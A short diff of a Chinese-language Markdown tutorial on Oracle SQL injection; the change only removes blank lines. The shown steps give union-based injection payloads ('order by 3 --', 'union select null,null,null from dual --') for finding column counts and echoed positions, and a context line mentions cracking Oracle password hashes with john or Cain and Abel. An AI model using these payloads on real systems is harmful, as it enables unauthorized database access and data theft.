@@ -84,15 +84,12 @@ Oracle 的用户密码可以使用 john 或者 cain and abel 进行破解，加�
 ### **二、Union注入**
 
 **Step 1.**判断列数：
-
 `' order by 3 --`
 
 **Step 2.**判断回显位置：
-
 `' union select null,null,null from dual --`
 
 **Step 3.**判断每个位置的数据类型：
-
 `' union select 'null',null,null from dual -- 每个位置加单引号，观察是否报错。`
 
 **Step 4.**获取数据库版本信息：
